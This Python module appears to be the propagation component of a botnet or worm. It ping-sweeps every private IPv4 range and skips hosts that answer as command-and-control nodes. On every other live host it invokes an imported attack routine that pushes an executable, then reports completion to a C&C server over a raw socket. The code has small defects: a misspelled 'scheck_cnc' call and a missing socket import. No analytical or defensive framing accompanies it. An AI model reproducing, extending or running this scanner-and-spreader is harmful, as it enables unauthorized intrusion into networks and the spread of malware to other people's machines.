import threading
import attack
import PingScan
global status
status = False
global a
a = None
def scan_and_attack(cnc_ip,cnc_port,executable,send,prnt,id_str):
	global status
	status = True
	global a
	for i in range(10,256): #192.168.0.0/16
		for j in range(100,256):
				ip = "192.168.%s.%s"%(i,j)
				if not status:
					send_finish(cnc_ip,cnc_port,prnt,id_str)
					return
				if PingScan.scanner(ip):
					if not check_cnc(ip):
						a = attack
						a.attack(ip,cnc_ip,cnc_port,executable,send,prnt)
	for i in range(16): #172.16.0.0/12
		for j in range(256):
			for h in range(256):
				ip = "172.%s.%s.%s"%(i+16,j,h)
				if not status:
					send_finish(cnc_ip,cnc_port,prnt,id_str)
					return
				if PingScan.scanner(ip):
					if not scheck_cnc(ip):
						a = attack
						a.attack(ip,cnc_ip,cnc_port,executable,send,prnt)
	for i in range(256): #10.0.0.0/8
		for j in range(256):
			for h in range(256):
				ip = "10.%s.%s.%s"%(i,j,h)
				if not status:
					send_finish(cnc_ip,cnc_port,prnt,id_str)
					return
				if PingScan.scanner(ip):
					if not check_cnc(ip):
						a = attack
						a.attack(ip,cnc_ip,cnc_port,executable,send,prnt)
	send_finish(cnc_ip,cnc_port,prnt,id_str)
def send_finish(cnc_ip,cnc_port,prnt,id_str):
		if prnt:
			print("finished local attack %s " % id_str)
			return
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((cnc_ip, int(cnc_port)))
		sock.send(("finished local attack %s" % id_str).encode())
		sock.close()

def check_cnc(ip):
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((ip, 8080))
		sock.settimeout(5.0)
		sock.send("ping".encode())
		data = sock.recv(1024)
		sock.close()
		msg = data.decode('utf-8').strip('\r\n')
		if msg == "pong":
			return True
		else:
			return False
	except:
		return False


def stop():
	global status
	global a
	if status:
		status = False
	if a:
		a.stop()
		a = None

#threading.Thread(target=scan_and_attack,args=("192.168.10.108","8080","file")).start()
#input("stop")
#print("close")
#stop()
